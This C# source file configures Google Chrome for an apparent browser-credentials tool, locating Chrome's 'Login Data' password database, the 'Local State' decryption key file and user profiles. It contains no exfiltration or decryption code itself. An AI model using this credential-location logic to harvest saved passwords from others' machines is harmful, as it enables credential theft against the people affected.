using ED.VersatilityExtensions.PrimitiveExtensions;

namespace VL.BrowserCredentials.Browsers
{

    [BrowserInfo("GoogleChrome", "Google Chrome")]
    internal class GoogleChromeSettings : AbstractBrowserSettings
    {

        internal override string BrowserCommonPath => @"Google\Chrome\User Data";

        internal override SettingDataType LoginDataType => SettingDataType.SQLite;

        internal override string DecryptionKeyPath => $@"{this.GetBrowserCommonPathFromRoot()}\Local State";

        internal override SettingDataType DecryptionKeyType => SettingDataType.JSON;

        internal override string ProcessName => "chrome";

        protected override UserFolderType FolderType => UserFolderType.Local;

        internal override string LoginDataPath(string profile) => $@"{this.GetBrowserCommonPathFromRoot()}\{profile}\Login Data";

        internal override IDictionary<string, string> GetProfiles()
        {
            var paths = new Dictionary<string, string>();

            foreach (var p in this.GetBrowserCommonPathFromRoot().GetSubDirectoriesPathOfCurrent("Profile*").Select(p => p.GetFileName()))
            {
                if (p is not null) paths.Add(p, p);
            }

            return paths;
        }

    }

}
